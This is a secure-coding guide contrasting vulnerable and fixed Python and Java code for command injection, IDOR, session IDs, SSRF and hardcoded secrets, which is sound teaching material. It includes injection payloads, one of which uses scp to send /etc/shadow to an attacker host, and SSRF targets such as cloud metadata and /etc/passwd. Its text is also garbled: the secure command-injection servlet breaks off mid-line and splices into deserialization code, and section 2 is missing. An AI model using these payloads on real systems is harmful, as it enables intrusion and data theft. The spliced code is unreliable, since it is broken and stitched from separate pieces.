# Comprehensive Guide to Web Application Security Vulnerabilities: Detailed Analysis with Python and Java Examples

This comprehensive guide examines ten critical web application security vulnerabilities, providing detailed explanations and practical code examples in both Python and Java to help developers understand and mitigate these threats.

## 1. Command Injection (CWE-77, CWE-78)

### Overview

Command injection vulnerabilities occur when an application executes native commands containing untrusted data, allowing attackers to execute arbitrary operating system commands on the server [1][2]. CWE-77 focuses on general command injection, while CWE-78 specifically addresses OS command injection [2].

### Python Example - Vulnerable Code

```python
import subprocess
import os
from flask import Flask, request

app = Flask(__name__)

@app.route("/dns")
def vulnerable_dns_lookup():
    hostname = request.values.get('hostname')
    # VULNERABLE: Direct string concatenation allows command injection
    cmd = 'nslookup ' + hostname
    return subprocess.check_output(cmd, shell=True)

@app.route("/file_process")
def vulnerable_file_process():
    filename = request.values.get('filename')
    # VULNERABLE: Using os.system with user input
    os.system(f"cat {filename}")
    return "File processed"
```

An attacker could exploit this by providing input like `google.com; cat /etc/passwd` which would execute both the intended nslookup command and the malicious cat command [3].

### Python Example - Secure Code

```python
import subprocess
import shlex
from flask import Flask, request

app = Flask(__name__)

@app.route("/dns")
def secure_dns_lookup():
    hostname = request.values.get('hostname')
    # SECURE: Pass command as list with shell=False
    cmd = ['nslookup', hostname]
    try:
        result = subprocess.check_output(cmd, shell=False, timeout=10)
        return result
    except subprocess.CalledProcessError:
        return "DNS lookup failed"

@app.route("/file_process")
def secure_file_process():
    filename = request.values.get('filename')
    # SECURE: Validate and sanitize input
    if not filename or not filename.isalnum():
        return "Invalid filename"
    
    # Use subprocess with list of arguments
    try:
        result = subprocess.run(['cat', filename], capture_output=True, 
                              shell=False, timeout=5)
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Operation timed out"
```

### Java Example - Vulnerable Code

```java
import javax.servlet.http.*;
import java.io.*;

public class VulnerableServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        String accountNumber = request.getParameter("account");
        String nickname = request.getParameter("nickname");
        
        // VULNERABLE: Direct string concatenation in command
        String makePDFCommand = "/opt/account_tools/bin/make_account_pdf " +
                accountNumber + " \"" + nickname + "\"";
        
        Runtime.getRuntime().exec(makePDFCommand);
        
        response.getWriter().println("PDF generated");
    }
}
```

This code is vulnerable because an attacker could provide a nickname like `Joint"; scp /etc/shadow hacker@mysite.tld: ; echo "` to execute additional commands [4].

### Java Example - Secure Code

```java
import javax.servlet.http.*;
import java.io.*;
import java.util.ArrayList;
import java.util.List;

public class SecureServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        String accountNumber = request.getParameter("account");
        String nickname = request.getParameter("nickname");
        
        // SECURE: Validate inputs
        if (!isValidAccountNumber(accountNumber) || !isValidNickname(nickname)) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid input");
            return;
        }
        
        // SECURE: Use ProcessBuilder with separate arguments
        ProcessBuilder pb = new ProcessBuilder();
        pb.command("/opt/account_tools/bin/make_account_pdf", accountNumber, nickname);
        
        try {
            Process process = pb.start();
            process.waitFor();
            response.getWriter().println("PDF generated successfully");
        } catch (InterruptedException e) {
            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
        }
    }
    
    private boolean isValidAccountNumber(String account) {
        return account != null && account.matches("\\d{9}");
    }
    
    private boolean isValidNickname(String nickname) {
        return nickname != null && nickname.length()  ALLOWED_CLASSES = Set.of(
        "com.example.SafeDataClass",
        "com.example.UserProfile",
        "java.lang.String",
        "java.lang.Integer"
    );
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        try {
            InputStream inputStream = request.getInputStream();
            
            // SECURE: Use custom ObjectInputStream with class filtering
            ObjectInputStream objectInputStream = new ObjectInputStream(inputStream) {
                @Override
                protected Class resolveClass(ObjectStreamClass desc) 
                        throws IOException, ClassNotFoundException {
                    
                    // Check if class is in whitelist
                    if (!ALLOWED_CLASSES.contains(desc.getName())) {
                        throw new InvalidClassException(
                            "Unauthorized deserialization attempt", desc.getName());
                    }
                    
                    return super.resolveClass(desc);
                }
            };
            
            Object object = objectInputStream.readObject();
            
            // Additional type checking after deserialization
            if (object instanceof com.example.SafeDataClass) {
                com.example.SafeDataClass safeObject = 
                    (com.example.SafeDataClass) object;
                
                response.getWriter().println("Safe object processed: " + 
                    safeObject.toString());
            } else {
                response.sendError(HttpServletResponse.SC_BAD_REQUEST, 
                    "Unexpected object type");
            }
            
        } catch (ClassNotFoundException | InvalidClassException e) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, 
                "Invalid or unauthorized class");
        }
    }
}
```

## 3. Insecure Direct Object Reference (IDOR) (CWE-639)

### Overview

Insecure Direct Object Reference (IDOR) vulnerabilities occur when applications provide direct access to objects based on user-supplied input without proper authorization checks [8][9]. This allows attackers to bypass authorization and access unauthorized data by manipulating identifiers [9].

### Python Example - Vulnerable Code

```python
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/user/')
def vulnerable_get_user(user_id):
    # VULNERABLE: No authorization check
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    user = cursor.fetchone()
    
    if user:
        return jsonify({
            'id': user[0],
            'name': user[1],
            'email': user[2],
            'ssn': user[3]  # Sensitive data exposed!
        })
    else:
        return "User not found", 404

@app.route('/update_profile', methods=['POST'])
def vulnerable_update_profile():
    # VULNERABLE: Hidden field can be manipulated
    user_id = request.form.get('user_id')
    name = request.form.get('name')
    email = request.form.get('email')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # No check if current user can modify this profile
    cursor.execute(
        "UPDATE users SET name = ?, email = ? WHERE id = ?",
        (name, email, user_id)
    )
    conn.commit()
    
    return "Profile updated"
```

An attacker could access other users' data by simply changing the user_id parameter: `/user/123` to `/user/124` [10][11].

### Python Example - Secure Code

```python
from flask import Flask, request, jsonify, session
import sqlite3
from functools import wraps

app = Flask(__name__)
app.secret_key = 'your-secret-key'

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return "Authentication required", 401
        return f(*args, **kwargs)
    return decorated_function

def check_user_access(requested_user_id, current_user_id):
    """Check if current user can access requested user's data"""
    return int(requested_user_id) == int(current_user_id)

@app.route('/user/')
@require_auth
def secure_get_user(user_id):
    current_user_id = session['user_id']
    
    # SECURE: Authorization check
    if not check_user_access(user_id, current_user_id):
        return "Access denied", 403
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT id, name, email FROM users WHERE id = ?", (user_id,))
    user = cursor.fetchone()
    
    if user:
        return jsonify({
            'id': user[0],
            'name': user[1],
            'email': user[2]
            # SSN removed - sensitive data not exposed
        })
    else:
        return "User not found", 404

@app.route('/update_profile', methods=['POST'])
@require_auth
def secure_update_profile():
    current_user_id = session['user_id']
    name = request.form.get('name')
    email = request.form.get('email')
    
    # SECURE: Use authenticated user's ID, not form data
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute(
        "UPDATE users SET name = ?, email = ? WHERE id = ?",
        (name, email, current_user_id)
    )
    conn.commit()
    
    return "Profile updated successfully"
```

### Java Example - Vulnerable Code

```java
import javax.servlet.http.*;
import java.sql.*;

@RequestMapping("/api/users")
public class VulnerableUserController {
    
    @GetMapping("/{id}")
    public ResponseEntity getUser(@PathVariable Long id) {
        // VULNERABLE: No authorization check
        try {
            Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
            PreparedStatement stmt = conn.prepareStatement(
                "SELECT * FROM users WHERE id = ?");
            stmt.setLong(1, id);
            
            ResultSet rs = stmt.executeQuery();
            if (rs.next()) {
                User user = new User();
                user.setId(rs.getLong("id"));
                user.setName(rs.getString("name"));
                user.setEmail(rs.getString("email"));
                user.setSsn(rs.getString("ssn")); // Sensitive data!
                
                return ResponseEntity.ok(user);
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        
        return ResponseEntity.notFound().build();
    }
    
    @PostMapping("/update")
    public ResponseEntity updateUser(
            @RequestParam Long userId,
            @RequestParam String name,
            @RequestParam String email) {
        
        // VULNERABLE: No check if current user can modify this profile
        try {
            Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
            PreparedStatement stmt = conn.prepareStatement(
                "UPDATE users SET name = ?, email = ? WHERE id = ?");
            stmt.setString(1, name);
            stmt.setString(2, email);
            stmt.setLong(3, userId);
            
            stmt.executeUpdate();
            return ResponseEntity.ok("User updated");
        } catch (SQLException e) {
            return ResponseEntity.status(500).body("Update failed");
        }
    }
}
```

### Java Example - Secure Code

```java
import javax.servlet.http.*;
import java.sql.*;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;

@RequestMapping("/api/users")
public class SecureUserController {
    
    @GetMapping("/{id}")
    public ResponseEntity getUser(@PathVariable Long id) {
        // SECURE: Get current authenticated user
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        Long currentUserId = getCurrentUserId(auth);
        
        // SECURE: Authorization check
        if (!currentUserId.equals(id) && !hasAdminRole(auth)) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
        }
        
        try {
            Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
            PreparedStatement stmt = conn.prepareStatement(
                "SELECT id, name, email FROM users WHERE id = ?");
            stmt.setLong(1, id);
            
            ResultSet rs = stmt.executeQuery();
            if (rs.next()) {
                User user = new User();
                user.setId(rs.getLong("id"));
                user.setName(rs.getString("name"));
                user.setEmail(rs.getString("email"));
                // SSN removed - sensitive data not exposed
                
                return ResponseEntity.ok(user);
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        
        return ResponseEntity.notFound().build();
    }
    
    @PostMapping("/update")
    public ResponseEntity updateUser(
            @RequestParam String name,
            @RequestParam String email) {
        
        // SECURE: Use authenticated user's ID only
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        Long currentUserId = getCurrentUserId(auth);
        
        try {
            Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
            PreparedStatement stmt = conn.prepareStatement(
                "UPDATE users SET name = ?, email = ? WHERE id = ?");
            stmt.setString(1, name);
            stmt.setString(2, email);
            stmt.setLong(3, currentUserId); // Use authenticated user's ID
            
            stmt.executeUpdate();
            return ResponseEntity.ok("Profile updated successfully");
        } catch (SQLException e) {
            return ResponseEntity.status(500).body("Update failed");
        }
    }
    
    private Long getCurrentUserId(Authentication auth) {
        // Extract user ID from authentication context
        UserPrincipal principal = (UserPrincipal) auth.getPrincipal();
        return principal.getId();
    }
    
    private boolean hasAdminRole(Authentication auth) {
        return auth.getAuthorities().stream()
            .anyMatch(grantedAuthority -> 
                grantedAuthority.getAuthority().equals("ROLE_ADMIN"));
    }
}
```

## 4. Insecure Session Identifier (Predictable Session ID) (CWE-330, CWE-384)

### Overview

Predictable Session ID vulnerabilities occur when session identifiers are generated in a predictable or sequential manner, making it easier for attackers to guess valid session IDs and hijack user sessions [12]. This can lead to unauthorized access and session hijacking attacks [12].

### Python Example - Vulnerable Code

```python
import random
from flask import Flask, session, request

app = Flask(__name__)
app.secret_key = 'secret'

# VULNERABLE: Global counter for session IDs
session_counter = 1000

@app.route('/login', methods=['POST'])
def vulnerable_login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if validate_credentials(username, password):
        global session_counter
        
        # VULNERABLE: Predictable session ID using counter
        session['session_id'] = str(session_counter)
        session_counter += 1
        
        return f"Welcome {username}! Session ID: {session['session_id']}"
    
    return "Invalid credentials"

@app.route('/login_random', methods=['POST'])
def vulnerable_random_login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if validate_credentials(username, password):
        # VULNERABLE: Using weak random number generator
        session['session_id'] = str(random.randint(1, 10000))
        
        return f"Welcome {username}!"
    
    return "Invalid credentials"

def validate_credentials(username, password):
    # Simplified validation
    return username == "admin" and password == "password"
```

### Python Example - Secure Code

```python
import secrets
import uuid
import hashlib
import time
from flask import Flask, session, request

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # Cryptographically secure secret

@app.route('/login', methods=['POST'])
def secure_login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if validate_credentials(username, password):
        # SECURE: Generate cryptographically secure session ID
        session_id = generate_secure_session_id()
        session['session_id'] = session_id
        session['username'] = username
        session['created_at'] = time.time()
        
        # Store session server-side (in production, use Redis/database)
        store_session(session_id, username)
        
        return f"Welcome {username}! Login successful."
    
    return "Invalid credentials"

def generate_secure_session_id():
    """Generate cryptographically secure session identifier"""
    # Method 1: Using secrets module
    return secrets.token_urlsafe(32)

def generate_secure_session_id_alternative():
    """Alternative secure session ID generation"""
    # Method 2: Using UUID4 (cryptographically secure)
    return str(uuid.uuid4())

def generate_secure_session_id_custom():
    """Custom secure session ID with additional entropy"""
    # Method 3: Combine multiple entropy sources
    timestamp = str(time.time()).encode()
    random_bytes = secrets.token_bytes(32)
    
    # Create hash from multiple entropy sources
    hasher = hashlib.sha256()
    hasher.update(timestamp)
    hasher.update(random_bytes)
    hasher.update(secrets.token_bytes(16))  # Additional randomness
    
    return hasher.hexdigest()

def store_session(session_id, username):
    """Store session information securely"""
    # In production, store in Redis or database with expiration
    # For demo purposes, using in-memory storage
    session_store = getattr(app, 'session_store', {})
    session_store[session_id] = {
        'username': username,
        'created_at': time.time(),
        'expires_at': time.time() + 3600  # 1 hour expiration
    }
    app.session_store = session_store

@app.route('/validate_session')
def validate_session():
    session_id = session.get('session_id')
    
    if not session_id:
        return "No session", 401
    
    # Validate session exists and hasn't expired
    session_store = getattr(app, 'session_store', {})
    session_data = session_store.get(session_id)
    
    if not session_data or time.time() > session_data['expires_at']:
        return "Session expired", 401
    
    return f"Valid session for user: {session_data['username']}"
```

### Java Example - Vulnerable Code

```java
import javax.servlet.http.*;
import java.util.Random;

public class VulnerableSessionServlet extends HttpServlet {
    private static int sessionCounter = 1000;
    private static Random random = new Random();
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        
        if (validateCredentials(username, password)) {
            HttpSession session = request.getSession();
            
            // VULNERABLE: Predictable session ID using counter
            String sessionId = String.valueOf(sessionCounter++);
            session.setAttribute("sessionId", sessionId);
            session.setAttribute("username", username);
            
            response.getWriter().println("Login successful. Session: " + sessionId);
        } else {
            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Invalid credentials");
        }
    }
    
    // Alternative vulnerable implementation
    protected void doPostWeak(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        
        if (validateCredentials(username, password)) {
            HttpSession session = request.getSession();
            
            // VULNERABLE: Weak random number generator
            String sessionId = String.valueOf(random.nextInt(10000));
            session.setAttribute("sessionId", sessionId);
            
            response.getWriter().println("Login successful");
        }
    }
    
    private boolean validateCredentials(String username, String password) {
        return "admin".equals(username) && "password".equals(password);
    }
}
```

### Java Example - Secure Code

```java
import javax.servlet.http.*;
import java.security.SecureRandom;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.time.Instant;
import java.time.temporal.ChronoUnit;

public class SecureSessionServlet extends HttpServlet {
    private static final SecureRandom secureRandom = new SecureRandom();
    private static final ConcurrentHashMap sessionStore = 
        new ConcurrentHashMap<>();
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        
        if (validateCredentials(username, password)) {
            // SECURE: Generate cryptographically secure session ID
            String sessionId = generateSecureSessionId();
            
            // Store session data securely
            SessionData sessionData = new SessionData();
            sessionData.username = username;
            sessionData.createdAt = Instant.now();
            sessionData.expiresAt = Instant.now().plus(1, ChronoUnit.HOURS);
            
            sessionStore.put(sessionId, sessionData);
            
            // Set secure cookie
            Cookie sessionCookie = new Cookie("JSESSIONID", sessionId);
            sessionCookie.setHttpOnly(true);  // Prevent XSS
            sessionCookie.setSecure(true);    // HTTPS only
            sessionCookie.setMaxAge(3600);    // 1 hour
            sessionCookie.setPath("/");
            
            response.addCookie(sessionCookie);
            response.getWriter().println("Login successful");
        } else {
            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Invalid credentials");
        }
    }
    
    private String generateSecureSessionId() {
        // Method 1: Using UUID (cryptographically secure)
        return UUID.randomUUID().toString();
    }
    
    private String generateSecureSessionIdAlternative() {
        // Method 2: Custom secure random string
        byte[] randomBytes = new byte[32];
        secureRandom.nextBytes(randomBytes);
        
        StringBuilder sb = new StringBuilder();
        for (byte b : randomBytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
    
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        // Validate session
        Cookie[] cookies = request.getCookies();
        String sessionId = null;
        
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("JSESSIONID".equals(cookie.getName())) {
                    sessionId = cookie.getValue();
                    break;
                }
            }
        }
        
        if (sessionId == null || !isValidSession(sessionId)) {
            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Invalid session");
            return;
        }
        
        SessionData sessionData = sessionStore.get(sessionId);
        response.getWriter().println("Welcome back, " + sessionData.username);
    }
    
    private boolean isValidSession(String sessionId) {
        SessionData sessionData = sessionStore.get(sessionId);
        
        if (sessionData == null) {
            return false;
        }
        
        // Check if session has expired
        if (Instant.now().isAfter(sessionData.expiresAt)) {
            sessionStore.remove(sessionId);  // Clean up expired session
            return false;
        }
        
        return true;
    }
    
    private boolean validateCredentials(String username, String password) {
        return "admin".equals(username) && "password".equals(password);
    }
    
    private static class SessionData {
        String username;
        Instant createdAt;
        Instant expiresAt;
    }
}
```

## 5. Server-Side Request Forgery (SSRF) (CWE-918)

### Overview

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to manipulate a server into making requests to unauthorized locations, potentially accessing internal systems or external services that should not be accessible [13][14]. SSRF attacks can bypass firewall protections and access internal administration interfaces [13].

### Python Example - Vulnerable Code

```python
import requests
from flask import Flask, request, jsonify
from urllib.parse import urlparse

app = Flask(__name__)

@app.route('/fetch_url', methods=['POST'])
def vulnerable_fetch_url():
    # VULNERABLE: No validation of target URL
    target_url = request.json.get('url')
    
    try:
        # Attacker can make server request any URL
        response = requests.get(target_url, timeout=10)
        return jsonify({
            'status': response.status_code,
            'content': response.text[:1000]  # Limit response size
        })
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/fetch_image', methods=['POST'])
def vulnerable_fetch_image():
    # VULNERABLE: Server fetches images from user-provided URLs
    image_url = request.json.get('image_url')
    
    try:
        response = requests.get(image_url)
        
        # Save image locally (dangerous!)
        with open(f'images/{image_url.split("/")[-1]}', 'wb') as f:
            f.write(response.content)
            
        return "Image downloaded successfully"
    except Exception as e:
        return f"Error: {e}"

@app.route('/proxy', methods=['GET'])
def vulnerable_proxy():
    # VULNERABLE: Acting as proxy without restrictions
    target = request.args.get('target')
    
    if target:
        try:
            response = requests.get(target)
            return response.content, response.status_code
        except Exception as e:
            return f"Proxy error: {e}", 500
    
    return "No target specified", 400
```

An attacker could exploit this by requesting internal URLs like `http://localhost:8080/admin`, `http://169.254.169.254/latest/meta-data/` (AWS metadata), or `file:///etc/passwd` [13][15].

### Python Example - Secure Code

```python
import requests
from flask import Flask, request, jsonify
from urllib.parse import urlparse
import ipaddress
import socket

app = Flask(__name__)

# Whitelist of allowed domains
ALLOWED_DOMAINS = {
    'api.github.com',
    'api.example.com',
    'cdn.example.com'
}

# Blacklisted IP ranges (private networks, localhost, etc.)
BLACKLISTED_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # Localhost
    ipaddress.ip_network('10.0.0.0/8'),       # Private Class A
    ipaddress.ip_network('172.16.0.0/12'),    # Private Class B
    ipaddress.ip_network('192.168.0.0/16'),   # Private Class C
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local
    ipaddress.ip_network('::1/128'),          # IPv6 localhost
    ipaddress.ip_network('fc00::/7'),         # IPv6 private
]

def is_safe_url(url):
    """Validate URL to prevent SSRF attacks"""
    try:
        parsed = urlparse(url)
        
        # Check protocol
        if parsed.scheme not in ['http', 'https']:
            return False, "Only HTTP/HTTPS protocols allowed"
        
        # Check if domain is in whitelist
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False, f"Domain {parsed.hostname} not allowed"
        
        # Resolve IP and check against blacklist
        try:
            ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
            for blocked_range in BLACKLISTED_IP_RANGES:
                if ip in blocked_range:
                    return False, f"IP {ip} is in blocked range"
        except (socket.gaierror, ValueError):
            return False, "Cannot resolve hostname"
        
        return True, "URL is safe"
        
    except Exception as e:
        return False, f"URL validation error: {e}"

@app.route('/fetch_url', methods=['POST'])
def secure_fetch_url():
    target_url = request.json.get('url')
    
    if not target_url:
        return jsonify({'error': 'URL is required'}), 400
    
    # SECURE: Validate URL before making request
    is_safe, message = is_safe_url(target_url)
    if not is_safe:
        return jsonify({'error': f'URL blocked: {message}'}), 403
    
    try:
        # Additional security measures
        response = requests.get(
            target_url,
            timeout=5,  # Short timeout
            allow_redirects=False,  # Prevent redirect-based bypasses
            headers={'User-Agent': 'SecureApp/1.0'}
        )
        
        # Limit response size
        if len(response.content) > 1024 * 1024:  # 1MB limit
            return jsonify({'error': 'Response too large'}), 413
        
        return jsonify({
            'status': response.status_code,
            'content': response.text[:1000],
            'headers': dict(response.headers)
        })
        
    except requests.RequestException as e:
        return jsonify({'error': f'Request failed: {e}'}), 500

@app.route('/fetch_image', methods=['POST'])
def secure_fetch_image():
    image_url = request.json.get('image_url')
    
    if not image_url:
        return jsonify({'error': 'Image URL is required'}), 400
    
    # SECURE: Validate URL
    is_safe, message = is_safe_url(image_url)
    if not is_safe:
        return jsonify({'error': f'URL blocked: {message}'}), 403
    
    try:
        response = requests.get(
            image_url,
            timeout=10,
            stream=True,  # Stream for large files
            headers={'User-Agent': 'SecureImageFetcher/1.0'}
        )
        
        # Validate content type
        content_type = response.headers.get('content-type', '')
        if not content_type.startswith('image/'):
            return jsonify({'error': 'URL does not point to an image'}), 400
        
        # Limit file size
        content_length = response.headers.get('content-length')
        if content_length and int(content_length) > 10 * 1024 * 1024:  # 10MB
            return jsonify({'error': 'Image too large'}), 413
        
        return jsonify({'message': 'Image validation successful'})
        
    except requests.RequestException as e:
        return jsonify({'error': f'Failed to fetch image: {e}'}), 500
```

### Java Example - Vulnerable Code

```java
import javax.servlet.http.*;
import java.io.*;
import java.net.*;

public class VulnerableSSRFServlet extends HttpServlet {
    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String targetUrl = request.getParameter("url");
        
        if (targetUrl != null) {
            try {
                // VULNERABLE: No validation of target URL
                URL url = new URL(targetUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(5000);
                connection.setReadTimeout(5000);
                
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream()));
                
                StringBuilder responseContent = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    responseContent.append(line);
                }
                
                response.setContentType("text/plain");
                response.getWriter().write(responseContent.toString());
                
            } catch (Exception e) {
                response.getWriter().write("Error: " + e.getMessage());
            }
        } else {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "URL parameter required");
        }
    }
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        // VULNERABLE: Webhook endpoint that fetches URLs
        String webhookUrl = request.getParameter("webhook_url");
        String data = request.getParameter("data");
        
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");
            
            // Send data to webhook (could be internal URL!)
            try (OutputStream os = connection.getOutputStream()) {
                os.write(data.getBytes());
            }
            
            int responseCode = connection.getResponseCode();
            response.getWriter().write("Webhook called, response: " + responseCode);
            
        } catch (Exception e) {
            response.getWriter().write("Webhook error: " + e.getMessage());
        }
    }
}
```

### Java Example - Secure Code

```java
import javax.servlet.http.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.regex.Pattern;

public class SecureSSRFServlet extends HttpServlet {
    
    // Whitelist of allowed domains
    private static final Set ALLOWED_DOMAINS = Set.of(
        "api.github.com",
        "api.example.com",
        "cdn.example.com"
    );
    
    // Regex patterns for private IP ranges
    private static final List BLOCKED_IP_PATTERNS = Arrays.asList(
        Pattern.compile("^127\\..*"),          // Localhost
        Pattern.compile("^10\\..*"),           // Private Class A
        Pattern.compile("^172\\.(1[6-9]|2[0-9]|3[01])\\..*"), // Private Class B
        Pattern.compile("^192\\.168\\..*"),    // Private Class C
        Pattern.compile("^169\\.254\\..*"),    // Link-local
        Pattern.compile("^::1$"),              // IPv6 localhost
        Pattern.compile("^fc[0-9a-f][0-9a-f]:.*") // IPv6 private
    );
    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String targetUrl = request.getParameter("url");
        
        if (targetUrl == null || targetUrl.trim().isEmpty()) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "URL parameter required");
            return;
        }
        
        // SECURE: Validate URL before making request
        ValidationResult validation = validateUrl(targetUrl);
        if (!validation.isValid) {
            response.sendError(HttpServletResponse.SC_FORBIDDEN, 
                "URL blocked: " + validation.reason);
            return;
        }
        
        try {
            URL url = new URL(targetUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.setInstanceFollowRedirects(false); // Prevent redirect bypasses
            connection.setRequestProperty("User-Agent", "SecureApp/1.0");
            
            // Check response size
            String contentLength = connection.getHeaderField("Content-Length");
            if (contentLength != null && Integer.parseInt(contentLength) > 1024 * 1024) {
                response.sendError(HttpServletResponse.SC_REQUEST_ENTITY_TOO_LARGE, 
                    "Response too large");
                return;
            }
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(connection.getInputStream()));
            
            StringBuilder responseContent = new StringBuilder();
            String line;
            int totalLength = 0;
            
            while ((line = reader.readLine()) != null) {
                totalLength += line.length();
                if (totalLength > 1024 * 1024) { // 1MB limit
                    break;
                }
                responseContent.append(line).append("\n");
            }
            
            response.setContentType("text/plain");
            response.getWriter().write(responseContent.toString());
            
        } catch (Exception e) {
            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, 
                "Request failed: " + e.getMessage());
        }
    }
    
    private ValidationResult validateUrl(String urlString) {
        try {
            URL url = new URL(urlString);
            
            // Check protocol
            if (!"http".equals(url.getProtocol()) && !"https".equals(url.getProtocol())) {
                return new ValidationResult(false, "Only HTTP/HTTPS protocols allowed");
            }
            
            String hostname = url.getHost();
            
            // Check domain whitelist
            if (!ALLOWED_DOMAINS.contains(hostname)) {
                return new ValidationResult(false, "Domain not in whitelist: " + hostname);
            }
            
            // Resolve IP and validate
            try {
                InetAddress address = InetAddress.getByName(hostname);
                String ip = address.getHostAddress();
                
                // Check against blocked IP patterns
                for (Pattern pattern : BLOCKED_IP_PATTERNS) {
                    if (pattern.matcher(ip).matches()) {
                        return new ValidationResult(false, "IP in blocked range: " + ip);
                    }
                }
                
                // Additional checks for special addresses
                if (address.isLoopbackAddress() || 
                    address.isLinkLocalAddress() || 
                    address.isSiteLocalAddress()) {
                    return new ValidationResult(false, "IP address type not allowed: " + ip);
                }
                
            } catch (UnknownHostException e) {
                return new ValidationResult(false, "Cannot resolve hostname: " + hostname);
            }
            
            return new ValidationResult(true, "URL is valid");
            
        } catch (MalformedURLException e) {
            return new ValidationResult(false, "Invalid URL format");
        }
    }
    
    private static class ValidationResult {
        boolean isValid;
        String reason;
        
        ValidationResult(boolean isValid, String reason) {
            this.isValid = isValid;
            this.reason = reason;
        }
    }
}
```

## 6. Secrets Exposure (CWE-200, CWE-312, CWE-522)

### Overview

Secrets exposure vulnerabilities occur when sensitive information such as passwords, API keys, or cryptographic keys are exposed to unauthorized actors [16]. This can happen through hardcoded credentials in source code, insecure storage, or inadequate access controls [17][18].

### Python Example - Vulnerable Code

```python
import requests
import mysql.connector
from flask import Flask, request, jsonify

app = Flask(__name__)

# VULNERABLE: Hardcoded secrets in source code
DATABASE_PASSWORD = "admin123"
API_KEY = "sk-1234567890abcdef"
JWT_SECRET = "mysecretkey"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE" 
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

@app.route('/connect_db')
def vulnerable_db_connect():
    try:
        # VULNERABLE: Password in connection string
        connection = mysql.connector.connect(
            host='localhost',
            database='myapp',
            user='root',
            password=DATABASE_PASSWORD  # Hardcoded password!
        )
        return "Database connected"
    except Exception as e:
        # VULNERABLE: Error message might expose sensitive info
        return f"Database error: {e}"

@app.route('/api_call')
def vulnerable_api_call():
    # VULNERABLE: API key hardcoded
    headers = {
        'Authorization': f'Bearer {API_KEY}',
        'User-Agent': 'MyApp/1.0'
    }
    
    try:
        response = requests.get('https://api.example.com/data', headers=headers)
        return response.json()
    except Exception as e:
        # VULNERABLE: Might log sensitive headers
        app.logger.error(f"API call failed: {e}, headers: {headers}")
        return "API call failed"

@app.route('/user_info')
def vulnerable_user_info():
    # VULNERABLE: Exposing sensitive user data
    user_data = {
        'id': 123,
        'username': 'john_doe',
        'email': 'john@example.com',
